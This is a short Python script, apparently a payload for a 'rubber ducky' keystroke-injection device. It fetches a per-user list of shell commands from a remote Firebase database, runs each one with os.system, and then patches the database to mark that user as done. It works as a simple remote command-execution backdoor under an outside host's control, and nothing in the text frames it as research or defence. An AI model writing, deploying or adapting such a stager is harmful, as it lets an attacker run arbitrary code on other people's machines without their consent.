import requests
import json
import os

USER = os.environ["USER"]

rq = requests.get("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json")
data = rq.json()

if data[USER]['executed'] == True: exit(0)

cmds = data[USER]['commands']

for cmd in cmds:
    os.system(cmd)

data[USER]['executed'] = True
requests.patch("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json", data=json.dumps(data))